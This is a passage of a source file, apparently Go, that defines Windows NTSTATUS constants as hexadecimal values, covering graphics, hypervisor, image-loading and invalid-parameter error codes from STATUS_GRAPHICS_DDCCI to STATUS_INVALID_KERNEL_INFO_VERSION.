STATUS_GRAPHICS_DDCCI_VCP_NOT_SUPPORTED                                   NTStatus      = 0xC01E0584
STATUS_GRAPHICS_DEPENDABLE_CHILD_STATUS                                   NTStatus      = 0x401E043C
STATUS_GRAPHICS_DISPLAY_DEVICE_NOT_ATTACHED_TO_DESKTOP                    NTStatus      = 0xC01E05E2
STATUS_GRAPHICS_DRIVER_MISMATCH                                           NTStatus      = 0xC01E0009
STATUS_GRAPHICS_EMPTY_ADAPTER_MONITOR_MODE_SUPPORT_INTERSECTION           NTStatus      = 0xC01E0325
STATUS_GRAPHICS_FREQUENCYRANGE_ALREADY_IN_SET                             NTStatus      = 0xC01E031F
STATUS_GRAPHICS_FREQUENCYRANGE_NOT_IN_SET                                 NTStatus      = 0xC01E031D
STATUS_GRAPHICS_GAMMA_RAMP_NOT_SUPPORTED                                  NTStatus      = 0xC01E0348
STATUS_GRAPHICS_GPU_EXCEPTION_ON_DEVICE                                   NTStatus      = 0xC01E0200
STATUS_GRAPHICS_I2C_DEVICE_DOES_NOT_EXIST                                 NTStatus      = 0xC01E0581
STATUS_GRAPHICS_I2C_ERROR_RECEIVING_DATA                                  NTStatus      = 0xC01E0583
STATUS_GRAPHICS_I2C_ERROR_TRANSMITTING_DATA                               NTStatus      = 0xC01E0582
STATUS_GRAPHICS_I2C_NOT_SUPPORTED                                         NTStatus      = 0xC01E0580
STATUS_GRAPHICS_INCOMPATIBLE_PRIVATE_FORMAT                               NTStatus      = 0xC01E0355
STATUS_GRAPHICS_INCONSISTENT_DEVICE_LINK_STATE                            NTStatus      = 0xC01E0436
STATUS_GRAPHICS_INDIRECT_DISPLAY_ABANDON_SWAPCHAIN                        NTStatus      = 0xC01E0012
STATUS_GRAPHICS_INDIRECT_DISPLAY_DEVICE_STOPPED                           NTStatus      = 0xC01E0013
STATUS_GRAPHICS_INSUFFICIENT_DMA_BUFFER                                   NTStatus      = 0xC01E0001
STATUS_GRAPHICS_INTERNAL_ERROR                                            NTStatus      = 0xC01E05E7
STATUS_GRAPHICS_INVALID_ACTIVE_REGION                                     NTStatus      = 0xC01E030B
STATUS_GRAPHICS_INVALID_ALLOCATION_HANDLE                                 NTStatus      = 0xC01E0114
STATUS_GRAPHICS_INVALID_ALLOCATION_INSTANCE                               NTStatus      = 0xC01E0113
STATUS_GRAPHICS_INVALID_ALLOCATION_USAGE                                  NTStatus      = 0xC01E0110
STATUS_GRAPHICS_INVALID_CLIENT_TYPE                                       NTStatus      = 0xC01E035B
STATUS_GRAPHICS_INVALID_COLORBASIS                                        NTStatus      = 0xC01E033E
STATUS_GRAPHICS_INVALID_COPYPROTECTION_TYPE                               NTStatus      = 0xC01E034F
STATUS_GRAPHICS_INVALID_DISPLAY_ADAPTER                                   NTStatus      = 0xC01E0002
STATUS_GRAPHICS_INVALID_DRIVER_MODEL                                      NTStatus      = 0xC01E0004
STATUS_GRAPHICS_INVALID_FREQUENCY                                         NTStatus      = 0xC01E030A
STATUS_GRAPHICS_INVALID_GAMMA_RAMP                                        NTStatus      = 0xC01E0347
STATUS_GRAPHICS_INVALID_MODE_PRUNING_ALGORITHM                            NTStatus      = 0xC01E0356
STATUS_GRAPHICS_INVALID_MONITORDESCRIPTOR                                 NTStatus      = 0xC01E032B
STATUS_GRAPHICS_INVALID_MONITORDESCRIPTORSET                              NTStatus      = 0xC01E032A
STATUS_GRAPHICS_INVALID_MONITOR_CAPABILITY_ORIGIN                         NTStatus      = 0xC01E0357
STATUS_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGE                            NTStatus      = 0xC01E031C
STATUS_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGESET                         NTStatus      = 0xC01E031B
STATUS_GRAPHICS_INVALID_MONITOR_FREQUENCYRANGE_CONSTRAINT                 NTStatus      = 0xC01E0358
STATUS_GRAPHICS_INVALID_MONITOR_SOURCEMODESET                             NTStatus      = 0xC01E0321
STATUS_GRAPHICS_INVALID_MONITOR_SOURCE_MODE                               NTStatus      = 0xC01E0322
STATUS_GRAPHICS_INVALID_PATH_CONTENT_GEOMETRY_TRANSFORMATION              NTStatus      = 0xC01E0345
STATUS_GRAPHICS_INVALID_PATH_CONTENT_TYPE                                 NTStatus      = 0xC01E034E
STATUS_GRAPHICS_INVALID_PATH_IMPORTANCE_ORDINAL                           NTStatus      = 0xC01E0344
STATUS_GRAPHICS_INVALID_PHYSICAL_MONITOR_HANDLE                           NTStatus      = 0xC01E058C
STATUS_GRAPHICS_INVALID_PIXELFORMAT                                       NTStatus      = 0xC01E033D
STATUS_GRAPHICS_INVALID_PIXELVALUEACCESSMODE                              NTStatus      = 0xC01E033F
STATUS_GRAPHICS_INVALID_POINTER                                           NTStatus      = 0xC01E05E4
STATUS_GRAPHICS_INVALID_PRIMARYSURFACE_SIZE                               NTStatus      = 0xC01E033A
STATUS_GRAPHICS_INVALID_SCANLINE_ORDERING                                 NTStatus      = 0xC01E0352
STATUS_GRAPHICS_INVALID_STRIDE                                            NTStatus      = 0xC01E033C
STATUS_GRAPHICS_INVALID_TOTAL_REGION                                      NTStatus      = 0xC01E030C
STATUS_GRAPHICS_INVALID_VIDEOPRESENTSOURCESET                             NTStatus      = 0xC01E0315
STATUS_GRAPHICS_INVALID_VIDEOPRESENTTARGETSET                             NTStatus      = 0xC01E0316
STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_SOURCE                              NTStatus      = 0xC01E0304
STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_SOURCE_MODE                         NTStatus      = 0xC01E0310
STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_TARGET                              NTStatus      = 0xC01E0305
STATUS_GRAPHICS_INVALID_VIDEO_PRESENT_TARGET_MODE                         NTStatus      = 0xC01E0311
STATUS_GRAPHICS_INVALID_VIDPN                                             NTStatus      = 0xC01E0303
STATUS_GRAPHICS_INVALID_VIDPN_PRESENT_PATH                                NTStatus      = 0xC01E0319
STATUS_GRAPHICS_INVALID_VIDPN_SOURCEMODESET                               NTStatus      = 0xC01E0308
STATUS_GRAPHICS_INVALID_VIDPN_TARGETMODESET                               NTStatus      = 0xC01E0309
STATUS_GRAPHICS_INVALID_VIDPN_TARGET_SUBSET_TYPE                          NTStatus      = 0xC01E032F
STATUS_GRAPHICS_INVALID_VIDPN_TOPOLOGY                                    NTStatus      = 0xC01E0300
STATUS_GRAPHICS_INVALID_VIDPN_TOPOLOGY_RECOMMENDATION_REASON              NTStatus      = 0xC01E034D
STATUS_GRAPHICS_INVALID_VISIBLEREGION_SIZE                                NTStatus      = 0xC01E033B
STATUS_GRAPHICS_LEADLINK_NOT_ENUMERATED                                   NTStatus      = 0xC01E0431
STATUS_GRAPHICS_LEADLINK_START_DEFERRED                                   NTStatus      = 0x401E0437
STATUS_GRAPHICS_MAX_NUM_PATHS_REACHED                                     NTStatus      = 0xC01E0359
STATUS_GRAPHICS_MCA_INTERNAL_ERROR                                        NTStatus      = 0xC01E0588
STATUS_GRAPHICS_MIRRORING_DEVICES_NOT_SUPPORTED                           NTStatus      = 0xC01E05E3
STATUS_GRAPHICS_MODE_ALREADY_IN_MODESET                                   NTStatus      = 0xC01E0314
STATUS_GRAPHICS_MODE_ID_MUST_BE_UNIQUE                                    NTStatus      = 0xC01E0324
STATUS_GRAPHICS_MODE_NOT_IN_MODESET                                       NTStatus      = 0xC01E034A
STATUS_GRAPHICS_MODE_NOT_PINNED                                           NTStatus      = 0x401E0307
STATUS_GRAPHICS_MONITORDESCRIPTOR_ALREADY_IN_SET                          NTStatus      = 0xC01E032D
STATUS_GRAPHICS_MONITORDESCRIPTOR_ID_MUST_BE_UNIQUE                       NTStatus      = 0xC01E032E
STATUS_GRAPHICS_MONITORDESCRIPTOR_NOT_IN_SET                              NTStatus      = 0xC01E032C
STATUS_GRAPHICS_MONITOR_COULD_NOT_BE_ASSOCIATED_WITH_ADAPTER              NTStatus      = 0xC01E0334
STATUS_GRAPHICS_MONITOR_NOT_CONNECTED                                     NTStatus      = 0xC01E0338
STATUS_GRAPHICS_MONITOR_NO_LONGER_EXISTS                                  NTStatus      = 0xC01E058D
STATUS_GRAPHICS_MULTISAMPLING_NOT_SUPPORTED                               NTStatus      = 0xC01E0349
STATUS_GRAPHICS_NOT_A_LINKED_ADAPTER                                      NTStatus      = 0xC01E0430
STATUS_GRAPHICS_NOT_EXCLUSIVE_MODE_OWNER                                  NTStatus      = 0xC01E0000
STATUS_GRAPHICS_NOT_POST_DEVICE_DRIVER                                    NTStatus      = 0xC01E0438
STATUS_GRAPHICS_NO_ACTIVE_VIDPN                                           NTStatus      = 0xC01E0336
STATUS_GRAPHICS_NO_AVAILABLE_IMPORTANCE_ORDINALS                          NTStatus      = 0xC01E0354
STATUS_GRAPHICS_NO_AVAILABLE_VIDPN_TARGET                                 NTStatus      = 0xC01E0333
STATUS_GRAPHICS_NO_DISPLAY_DEVICE_CORRESPONDS_TO_NAME                     NTStatus      = 0xC01E05E1
STATUS_GRAPHICS_NO_DISPLAY_MODE_MANAGEMENT_SUPPORT                        NTStatus      = 0xC01E0341
STATUS_GRAPHICS_NO_MONITORS_CORRESPOND_TO_DISPLAY_DEVICE                  NTStatus      = 0xC01E05E5
STATUS_GRAPHICS_NO_MORE_ELEMENTS_IN_DATASET                               NTStatus      = 0x401E034C
STATUS_GRAPHICS_NO_PREFERRED_MODE                                         NTStatus      = 0x401E031E
STATUS_GRAPHICS_NO_RECOMMENDED_FUNCTIONAL_VIDPN                           NTStatus      = 0xC01E0323
STATUS_GRAPHICS_NO_RECOMMENDED_VIDPN_TOPOLOGY                             NTStatus      = 0xC01E031A
STATUS_GRAPHICS_NO_VIDEO_MEMORY                                           NTStatus      = 0xC01E0100
STATUS_GRAPHICS_NO_VIDPNMGR                                               NTStatus      = 0xC01E0335
STATUS_GRAPHICS_ONLY_CONSOLE_SESSION_SUPPORTED                            NTStatus      = 0xC01E05E0
STATUS_GRAPHICS_OPM_ALL_HDCP_HARDWARE_ALREADY_IN_USE                      NTStatus      = 0xC01E0518
STATUS_GRAPHICS_OPM_DRIVER_INTERNAL_ERROR                                 NTStatus      = 0xC01E051E
STATUS_GRAPHICS_OPM_HDCP_SRM_NEVER_SET                                    NTStatus      = 0xC01E0516
STATUS_GRAPHICS_OPM_INTERNAL_ERROR                                        NTStatus      = 0xC01E050B
STATUS_GRAPHICS_OPM_INVALID_CONFIGURATION_REQUEST                         NTStatus      = 0xC01E0521
STATUS_GRAPHICS_OPM_INVALID_ENCRYPTED_PARAMETERS                          NTStatus      = 0xC01E0503
STATUS_GRAPHICS_OPM_INVALID_HANDLE                                        NTStatus      = 0xC01E050C
STATUS_GRAPHICS_OPM_INVALID_INFORMATION_REQUEST                           NTStatus      = 0xC01E051D
STATUS_GRAPHICS_OPM_INVALID_SRM                                           NTStatus      = 0xC01E0512
STATUS_GRAPHICS_OPM_NOT_SUPPORTED                                         NTStatus      = 0xC01E0500
STATUS_GRAPHICS_OPM_NO_PROTECTED_OUTPUTS_EXIST                            NTStatus      = 0xC01E0505
STATUS_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_ACP                           NTStatus      = 0xC01E0514
STATUS_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_CGMSA                         NTStatus      = 0xC01E0515
STATUS_GRAPHICS_OPM_OUTPUT_DOES_NOT_SUPPORT_HDCP                          NTStatus      = 0xC01E0513
STATUS_GRAPHICS_OPM_PROTECTED_OUTPUT_DOES_NOT_HAVE_COPP_SEMANTICS         NTStatus      = 0xC01E051C
STATUS_GRAPHICS_OPM_PROTECTED_OUTPUT_DOES_NOT_HAVE_OPM_SEMANTICS          NTStatus      = 0xC01E051F
STATUS_GRAPHICS_OPM_PROTECTED_OUTPUT_NO_LONGER_EXISTS                     NTStatus      = 0xC01E051A
STATUS_GRAPHICS_OPM_RESOLUTION_TOO_HIGH                                   NTStatus      = 0xC01E0517
STATUS_GRAPHICS_OPM_SIGNALING_NOT_SUPPORTED                               NTStatus      = 0xC01E0520
STATUS_GRAPHICS_OPM_SPANNING_MODE_ENABLED                                 NTStatus      = 0xC01E050F
STATUS_GRAPHICS_OPM_THEATER_MODE_ENABLED                                  NTStatus      = 0xC01E0510
STATUS_GRAPHICS_PARAMETER_ARRAY_TOO_SMALL                                 NTStatus      = 0xC01E05E6
STATUS_GRAPHICS_PARTIAL_DATA_POPULATED                                    NTStatus      = 0x401E000A
STATUS_GRAPHICS_PATH_ALREADY_IN_TOPOLOGY                                  NTStatus      = 0xC01E0313
STATUS_GRAPHICS_PATH_CONTENT_GEOMETRY_TRANSFORMATION_NOT_PINNED           NTStatus      = 0x401E0351
STATUS_GRAPHICS_PATH_CONTENT_GEOMETRY_TRANSFORMATION_NOT_SUPPORTED        NTStatus      = 0xC01E0346
STATUS_GRAPHICS_PATH_NOT_IN_TOPOLOGY                                      NTStatus      = 0xC01E0327
STATUS_GRAPHICS_PINNED_MODE_MUST_REMAIN_IN_SET                            NTStatus      = 0xC01E0312
STATUS_GRAPHICS_POLLING_TOO_FREQUENTLY                                    NTStatus      = 0x401E0439
STATUS_GRAPHICS_PRESENT_BUFFER_NOT_BOUND                                  NTStatus      = 0xC01E0010
STATUS_GRAPHICS_PRESENT_DENIED                                            NTStatus      = 0xC01E0007
STATUS_GRAPHICS_PRESENT_INVALID_WINDOW                                    NTStatus      = 0xC01E000F
STATUS_GRAPHICS_PRESENT_MODE_CHANGED                                      NTStatus      = 0xC01E0005
STATUS_GRAPHICS_PRESENT_OCCLUDED                                          NTStatus      = 0xC01E0006
STATUS_GRAPHICS_PRESENT_REDIRECTION_DISABLED                              NTStatus      = 0xC01E000B
STATUS_GRAPHICS_PRESENT_UNOCCLUDED                                        NTStatus      = 0xC01E000C
STATUS_GRAPHICS_PVP_HFS_FAILED                                            NTStatus      = 0xC01E0511
STATUS_GRAPHICS_PVP_INVALID_CERTIFICATE_LENGTH                            NTStatus      = 0xC01E050E
STATUS_GRAPHICS_RESOURCES_NOT_RELATED                                     NTStatus      = 0xC01E0330
STATUS_GRAPHICS_SESSION_TYPE_CHANGE_IN_PROGRESS                           NTStatus      = 0xC01E05E8
STATUS_GRAPHICS_SKIP_ALLOCATION_PREPARATION                               NTStatus      = 0x401E0201
STATUS_GRAPHICS_SOURCE_ALREADY_IN_SET                                     NTStatus      = 0xC01E0317
STATUS_GRAPHICS_SOURCE_ID_MUST_BE_UNIQUE                                  NTStatus      = 0xC01E0331
STATUS_GRAPHICS_SOURCE_NOT_IN_TOPOLOGY                                    NTStatus      = 0xC01E0339
STATUS_GRAPHICS_SPECIFIED_CHILD_ALREADY_CONNECTED                         NTStatus      = 0xC01E0400
STATUS_GRAPHICS_STALE_MODESET                                             NTStatus      = 0xC01E0320
STATUS_GRAPHICS_STALE_VIDPN_TOPOLOGY                                      NTStatus      = 0xC01E0337
STATUS_GRAPHICS_START_DEFERRED                                            NTStatus      = 0x401E043A
STATUS_GRAPHICS_TARGET_ALREADY_IN_SET                                     NTStatus      = 0xC01E0318
STATUS_GRAPHICS_TARGET_ID_MUST_BE_UNIQUE                                  NTStatus      = 0xC01E0332
STATUS_GRAPHICS_TARGET_NOT_IN_TOPOLOGY                                    NTStatus      = 0xC01E0340
STATUS_GRAPHICS_TOO_MANY_REFERENCES                                       NTStatus      = 0xC01E0103
STATUS_GRAPHICS_TOPOLOGY_CHANGES_NOT_ALLOWED                              NTStatus      = 0xC01E0353
STATUS_GRAPHICS_TRY_AGAIN_LATER                                           NTStatus      = 0xC01E0104
STATUS_GRAPHICS_TRY_AGAIN_NOW                                             NTStatus      = 0xC01E0105
STATUS_GRAPHICS_UAB_NOT_SUPPORTED                                         NTStatus      = 0xC01E0502
STATUS_GRAPHICS_UNASSIGNED_MODESET_ALREADY_EXISTS                         NTStatus      = 0xC01E0350
STATUS_GRAPHICS_UNKNOWN_CHILD_STATUS                                      NTStatus      = 0x401E042F
STATUS_GRAPHICS_UNSWIZZLING_APERTURE_UNAVAILABLE                          NTStatus      = 0xC01E0107
STATUS_GRAPHICS_UNSWIZZLING_APERTURE_UNSUPPORTED                          NTStatus      = 0xC01E0108
STATUS_GRAPHICS_VAIL_STATE_CHANGED                                        NTStatus      = 0xC01E0011
STATUS_GRAPHICS_VIDEO_PRESENT_TARGETS_LESS_THAN_SOURCES                   NTStatus      = 0xC01E0326
STATUS_GRAPHICS_VIDPN_MODALITY_NOT_SUPPORTED                              NTStatus      = 0xC01E0306
STATUS_GRAPHICS_VIDPN_SOURCE_IN_USE                                       NTStatus      = 0xC01E0342
STATUS_GRAPHICS_VIDPN_TOPOLOGY_CURRENTLY_NOT_SUPPORTED                    NTStatus      = 0xC01E0302
STATUS_GRAPHICS_VIDPN_TOPOLOGY_NOT_SUPPORTED                              NTStatus      = 0xC01E0301
STATUS_GRAPHICS_WINDOWDC_NOT_AVAILABLE                                    NTStatus      = 0xC01E000D
STATUS_GRAPHICS_WINDOWLESS_PRESENT_DISABLED                               NTStatus      = 0xC01E000E
STATUS_GRAPHICS_WRONG_ALLOCATION_DEVICE                                   NTStatus      = 0xC01E0115
STATUS_GROUP_EXISTS                                                       NTStatus      = 0xC0000065
STATUS_GUARD_PAGE_VIOLATION                                               NTStatus      = 0x80000001
STATUS_GUIDS_EXHAUSTED                                                    NTStatus      = 0xC0000083
STATUS_GUID_SUBSTITUTION_MADE                                             NTStatus      = 0x8000000C
STATUS_HANDLES_CLOSED                                                     NTStatus      = 0x8000000A
STATUS_HANDLE_NOT_CLOSABLE                                                NTStatus      = 0xC0000235
STATUS_HANDLE_NO_LONGER_VALID                                             NTStatus      = 0xC0190028
STATUS_HANDLE_REVOKED                                                     NTStatus      = 0xC000A006
STATUS_HARDWARE_MEMORY_ERROR                                              NTStatus      = 0xC0000709
STATUS_HASH_NOT_PRESENT                                                   NTStatus      = 0xC000A101
STATUS_HASH_NOT_SUPPORTED                                                 NTStatus      = 0xC000A100
STATUS_HDAUDIO_CONNECTION_LIST_NOT_SUPPORTED                              NTStatus      = 0xC0440003
STATUS_HDAUDIO_EMPTY_CONNECTION_LIST                                      NTStatus      = 0xC0440002
STATUS_HDAUDIO_NO_LOGICAL_DEVICES_CREATED                                 NTStatus      = 0xC0440004
STATUS_HDAUDIO_NULL_LINKED_LIST_ENTRY                                     NTStatus      = 0xC0440005
STATUS_HEAP_CORRUPTION                                                    NTStatus      = 0xC0000374
STATUS_HEURISTIC_DAMAGE_POSSIBLE                                          NTStatus      = 0x40190001
STATUS_HIBERNATED                                                         NTStatus      = 0x4000002A
STATUS_HIBERNATION_FAILURE                                                NTStatus      = 0xC0000411
STATUS_HIVE_UNLOADED                                                      NTStatus      = 0xC0000425
STATUS_HMAC_NOT_SUPPORTED                                                 NTStatus      = 0xC000A001
STATUS_HOPLIMIT_EXCEEDED                                                  NTStatus      = 0xC000A012
STATUS_HOST_DOWN                                                          NTStatus      = 0xC0000350
STATUS_HOST_UNREACHABLE                                                   NTStatus      = 0xC000023D
STATUS_HUNG_DISPLAY_DRIVER_THREAD                                         NTStatus      = 0xC0000415
STATUS_HV_ACCESS_DENIED                                                   NTStatus      = 0xC0350006
STATUS_HV_ACKNOWLEDGED                                                    NTStatus      = 0xC0350016
STATUS_HV_CPUID_FEATURE_VALIDATION_ERROR                                  NTStatus      = 0xC035003C
STATUS_HV_CPUID_XSAVE_FEATURE_VALIDATION_ERROR                            NTStatus      = 0xC035003D
STATUS_HV_FEATURE_UNAVAILABLE                                             NTStatus      = 0xC035001E
STATUS_HV_INACTIVE                                                        NTStatus      = 0xC035001C
STATUS_HV_INSUFFICIENT_BUFFER                                             NTStatus      = 0xC0350033
STATUS_HV_INSUFFICIENT_BUFFERS                                            NTStatus      = 0xC0350013
STATUS_HV_INSUFFICIENT_DEVICE_DOMAINS                                     NTStatus      = 0xC0350038
STATUS_HV_INSUFFICIENT_MEMORY                                             NTStatus      = 0xC035000B
STATUS_HV_INSUFFICIENT_ROOT_MEMORY                                        NTStatus      = 0xC0350073
STATUS_HV_INVALID_ALIGNMENT                                               NTStatus      = 0xC0350004
STATUS_HV_INVALID_CONNECTION_ID                                           NTStatus      = 0xC0350012
STATUS_HV_INVALID_CPU_GROUP_ID                                            NTStatus      = 0xC035006F
STATUS_HV_INVALID_CPU_GROUP_STATE                                         NTStatus      = 0xC0350070
STATUS_HV_INVALID_DEVICE_ID                                               NTStatus      = 0xC0350057
STATUS_HV_INVALID_DEVICE_STATE                                            NTStatus      = 0xC0350058
STATUS_HV_INVALID_HYPERCALL_CODE                                          NTStatus      = 0xC0350002
STATUS_HV_INVALID_HYPERCALL_INPUT                                         NTStatus      = 0xC0350003
STATUS_HV_INVALID_LP_INDEX                                                NTStatus      = 0xC0350041
STATUS_HV_INVALID_PARAMETER                                               NTStatus      = 0xC0350005
STATUS_HV_INVALID_PARTITION_ID                                            NTStatus      = 0xC035000D
STATUS_HV_INVALID_PARTITION_STATE                                         NTStatus      = 0xC0350007
STATUS_HV_INVALID_PORT_ID                                                 NTStatus      = 0xC0350011
STATUS_HV_INVALID_PROXIMITY_DOMAIN_INFO                                   NTStatus      = 0xC035001A
STATUS_HV_INVALID_REGISTER_VALUE                                          NTStatus      = 0xC0350050
STATUS_HV_INVALID_SAVE_RESTORE_STATE                                      NTStatus      = 0xC0350017
STATUS_HV_INVALID_SYNIC_STATE                                             NTStatus      = 0xC0350018
STATUS_HV_INVALID_VP_INDEX                                                NTStatus      = 0xC035000E
STATUS_HV_INVALID_VP_STATE                                                NTStatus      = 0xC0350015
STATUS_HV_INVALID_VTL_STATE                                               NTStatus      = 0xC0350051
STATUS_HV_NOT_ACKNOWLEDGED                                                NTStatus      = 0xC0350014
STATUS_HV_NOT_ALLOWED_WITH_NESTED_VIRT_ACTIVE                             NTStatus      = 0xC0350072
STATUS_HV_NOT_PRESENT                                                     NTStatus      = 0xC0351000
STATUS_HV_NO_DATA                                                         NTStatus      = 0xC035001B
STATUS_HV_NO_RESOURCES                                                    NTStatus      = 0xC035001D
STATUS_HV_NX_NOT_DETECTED                                                 NTStatus      = 0xC0350055
STATUS_HV_OBJECT_IN_USE                                                   NTStatus      = 0xC0350019
STATUS_HV_OPERATION_DENIED                                                NTStatus      = 0xC0350008
STATUS_HV_OPERATION_FAILED                                                NTStatus      = 0xC0350071
STATUS_HV_PAGE_REQUEST_INVALID                                            NTStatus      = 0xC0350060
STATUS_HV_PARTITION_TOO_DEEP                                              NTStatus      = 0xC035000C
STATUS_HV_PENDING_PAGE_REQUESTS                                           NTStatus      = 0x00350059
STATUS_HV_PROCESSOR_STARTUP_TIMEOUT                                       NTStatus      = 0xC035003E
STATUS_HV_PROPERTY_VALUE_OUT_OF_RANGE                                     NTStatus      = 0xC035000A
STATUS_HV_SMX_ENABLED                                                     NTStatus      = 0xC035003F
STATUS_HV_UNKNOWN_PROPERTY                                                NTStatus      = 0xC0350009
STATUS_ILLEGAL_CHARACTER                                                  NTStatus      = 0xC0000161
STATUS_ILLEGAL_DLL_RELOCATION                                             NTStatus      = 0xC0000269
STATUS_ILLEGAL_ELEMENT_ADDRESS                                            NTStatus      = 0xC0000285
STATUS_ILLEGAL_FLOAT_CONTEXT                                              NTStatus      = 0xC000014A
STATUS_ILLEGAL_FUNCTION                                                   NTStatus      = 0xC00000AF
STATUS_ILLEGAL_INSTRUCTION                                                NTStatus      = 0xC000001D
STATUS_ILL_FORMED_PASSWORD                                                NTStatus      = 0xC000006B
STATUS_ILL_FORMED_SERVICE_ENTRY                                           NTStatus      = 0xC0000160
STATUS_IMAGE_ALREADY_LOADED                                               NTStatus      = 0xC000010E
STATUS_IMAGE_ALREADY_LOADED_AS_DLL                                        NTStatus      = 0xC000019D
STATUS_IMAGE_AT_DIFFERENT_BASE                                            NTStatus      = 0x40000036
STATUS_IMAGE_CERT_EXPIRED                                                 NTStatus      = 0xC0000605
STATUS_IMAGE_CERT_REVOKED                                                 NTStatus      = 0xC0000603
STATUS_IMAGE_CHECKSUM_MISMATCH                                            NTStatus      = 0xC0000221
STATUS_IMAGE_MACHINE_TYPE_MISMATCH                                        NTStatus      = 0x4000000E
STATUS_IMAGE_MACHINE_TYPE_MISMATCH_EXE                                    NTStatus      = 0x40000023
STATUS_IMAGE_MP_UP_MISMATCH                                               NTStatus      = 0xC0000249
STATUS_IMAGE_NOT_AT_BASE                                                  NTStatus      = 0x40000003
STATUS_IMAGE_SUBSYSTEM_NOT_PRESENT                                        NTStatus      = 0xC00001A3
STATUS_IMPLEMENTATION_LIMIT                                               NTStatus      = 0xC000042B
STATUS_INCOMPATIBLE_DRIVER_BLOCKED                                        NTStatus      = 0xC0000424
STATUS_INCOMPATIBLE_FILE_MAP                                              NTStatus      = 0xC000004D
STATUS_INCOMPATIBLE_WITH_GLOBAL_SHORT_NAME_REGISTRY_SETTING               NTStatus      = 0xC000019E
STATUS_INCORRECT_ACCOUNT_TYPE                                             NTStatus      = 0xC000A089
STATUS_INDOUBT_TRANSACTIONS_EXIST                                         NTStatus      = 0xC019003A
STATUS_INFO_LENGTH_MISMATCH                                               NTStatus      = 0xC0000004
STATUS_INSTANCE_NOT_AVAILABLE                                             NTStatus      = 0xC00000AB
STATUS_INSTRUCTION_MISALIGNMENT                                           NTStatus      = 0xC00000AA
STATUS_INSUFFICIENT_LOGON_INFO                                            NTStatus      = 0xC0000250
STATUS_INSUFFICIENT_NVRAM_RESOURCES                                       NTStatus      = 0xC0000454
STATUS_INSUFFICIENT_POWER                                                 NTStatus      = 0xC00002DE
STATUS_INSUFFICIENT_RESOURCES                                             NTStatus      = 0xC000009A
STATUS_INSUFFICIENT_RESOURCE_FOR_SPECIFIED_SHARED_SECTION_SIZE            NTStatus      = 0xC0000416
STATUS_INSUFF_SERVER_RESOURCES                                            NTStatus      = 0xC0000205
STATUS_INTEGER_DIVIDE_BY_ZERO                                             NTStatus      = 0xC0000094
STATUS_INTEGER_OVERFLOW                                                   NTStatus      = 0xC0000095
STATUS_INTERMIXED_KERNEL_EA_OPERATION                                     NTStatus      = 0xC0000471
STATUS_INTERNAL_DB_CORRUPTION                                             NTStatus      = 0xC00000E4
STATUS_INTERNAL_DB_ERROR                                                  NTStatus      = 0xC0000158
STATUS_INTERNAL_ERROR                                                     NTStatus      = 0xC00000E5
STATUS_INTERRUPTED                                                        NTStatus      = 0xC0000515
STATUS_INTERRUPT_STILL_CONNECTED                                          NTStatus      = 0x00000128
STATUS_INTERRUPT_VECTOR_ALREADY_CONNECTED                                 NTStatus      = 0x00000127
STATUS_INVALID_ACCOUNT_NAME                                               NTStatus      = 0xC0000062
STATUS_INVALID_ACE_CONDITION                                              NTStatus      = 0xC00001A2
STATUS_INVALID_ACL                                                        NTStatus      = 0xC0000077
STATUS_INVALID_ADDRESS                                                    NTStatus      = 0xC0000141
STATUS_INVALID_ADDRESS_COMPONENT                                          NTStatus      = 0xC0000207
STATUS_INVALID_ADDRESS_WILDCARD                                           NTStatus      = 0xC0000208
STATUS_INVALID_BLOCK_LENGTH                                               NTStatus      = 0xC0000173
STATUS_INVALID_BUFFER_SIZE                                                NTStatus      = 0xC0000206
STATUS_INVALID_CAP                                                        NTStatus      = 0xC0000505
STATUS_INVALID_CID                                                        NTStatus      = 0xC000000B
STATUS_INVALID_COMPUTER_NAME                                              NTStatus      = 0xC0000122
STATUS_INVALID_CONNECTION                                                 NTStatus      = 0xC0000140
STATUS_INVALID_CRUNTIME_PARAMETER                                         NTStatus      = 0xC0000417
STATUS_INVALID_DEVICE_OBJECT_PARAMETER                                    NTStatus      = 0xC0000369
STATUS_INVALID_DEVICE_REQUEST                                             NTStatus      = 0xC0000010
STATUS_INVALID_DEVICE_STATE                                               NTStatus      = 0xC0000184
STATUS_INVALID_DISPOSITION                                                NTStatus      = 0xC0000026
STATUS_INVALID_DOMAIN_ROLE                                                NTStatus      = 0xC00000DE
STATUS_INVALID_DOMAIN_STATE                                               NTStatus      = 0xC00000DD
STATUS_INVALID_EA_FLAG                                                    NTStatus      = 0x80000015
STATUS_INVALID_EA_NAME                                                    NTStatus      = 0x80000013
STATUS_INVALID_EXCEPTION_HANDLER                                          NTStatus      = 0xC00001A5
STATUS_INVALID_FIELD_IN_PARAMETER_LIST                                    NTStatus      = 0xC0000475
STATUS_INVALID_FILE_FOR_SECTION                                           NTStatus      = 0xC0000020
STATUS_INVALID_GROUP_ATTRIBUTES                                           NTStatus      = 0xC00000A4
STATUS_INVALID_HANDLE                                                     NTStatus      = 0xC0000008
STATUS_INVALID_HW_PROFILE                                                 NTStatus      = 0xC0000260
STATUS_INVALID_IDN_NORMALIZATION                                          NTStatus      = 0xC0000716
STATUS_INVALID_ID_AUTHORITY                                               NTStatus      = 0xC0000084
STATUS_INVALID_IMAGE_FORMAT                                               NTStatus      = 0xC000007B
STATUS_INVALID_IMAGE_HASH                                                 NTStatus      = 0xC0000428
STATUS_INVALID_IMAGE_LE_FORMAT                                            NTStatus      = 0xC000012E
STATUS_INVALID_IMAGE_NE_FORMAT                                            NTStatus      = 0xC000011B
STATUS_INVALID_IMAGE_NOT_MZ                                               NTStatus      = 0xC000012F
STATUS_INVALID_IMAGE_PROTECT                                              NTStatus      = 0xC0000130
STATUS_INVALID_IMAGE_WIN_16                                               NTStatus      = 0xC0000131
STATUS_INVALID_IMAGE_WIN_32                                               NTStatus      = 0xC0000359
STATUS_INVALID_IMAGE_WIN_64                                               NTStatus      = 0xC000035A
STATUS_INVALID_IMPORT_OF_NON_DLL                                          NTStatus      = 0xC000036F
STATUS_INVALID_INFO_CLASS                                                 NTStatus      = 0xC0000003
STATUS_INVALID_INITIATOR_TARGET_PATH                                      NTStatus      = 0xC0000477
STATUS_INVALID_KERNEL_INFO_VERSION                                        NTStatus      = 0xC000A004
